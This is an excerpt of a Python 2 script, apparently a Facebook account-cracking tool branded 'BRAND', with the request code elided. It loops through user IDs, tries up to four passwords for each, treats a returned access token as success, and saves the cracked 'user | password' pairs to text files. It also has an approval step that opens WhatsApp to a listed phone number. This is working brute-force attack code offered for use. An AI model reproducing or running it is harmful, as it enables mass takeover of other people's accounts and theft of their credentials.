...
def reg2():
    ...
    os.system('am start https://wa.me/+923063450505?text=Please%20Give%20Me%20Approve%20Sir:%20' + id )
...
def login():
    ...
    print logo1
    print 47 * '\x1b[1;91m-'
    print '\x1b[1;91m         [\x1b[1;93m*\x1b[1;91m]\x1b[1;92m BRAND OLD UID CRACKING\x1b[1;91m [\x1b[1;93m*\x1b[1;91m]'
    print 47 * '\x1b[1;91m-'
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m [\x1b[1;92mBRAND-OK\x1b[1;92m] ' + k + c + user + '  |  ' + pass1
                okb = open('BRANDok.txt', 'a')
                okb.write(k + c + user + " | " + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m [\x1b[1;91mBRAND-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass1
                cps = open('BRANDcp.txt', 'a')
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m [\x1b[1;92mBRAND-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass2
                    okb = open('BRANDok.txt', 'a')
                    okb.write(k + c + user + " | " + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m [\x1b[1;91mBRAND-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass2
                    cps = open('BRANDcp.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m [\x1b[1;92mBRAND-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass3
                        okb = open('BRANDok.txt', 'a')
                        okb.write(k + c + user + " | " + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m [\x1b[1;91mBRAND-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass3
                        cps = open('BRANDcp.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m [\x1b[1;92mBRAND-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass4
                            okb = open('BRAND-OK.txt', 'a')
                            okb.write(k + c + user + " | " + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m [\x1b[1;91mBRAND-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass4
                            cps = open('BRANDcp.txt', 'a')
    ...
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Total \x1b[1;92mBRAND-OK/\x1b[1;91mNIKI-CP \x1b[1;93m: ' + str(len(oks)) + '/' + str(len(cpb))
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Cloned Accounts Has Been Saved\x1b[1;93m :\x1b[1;92m BRAND.txt'
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Thanks For Using BRAND...TOOL'
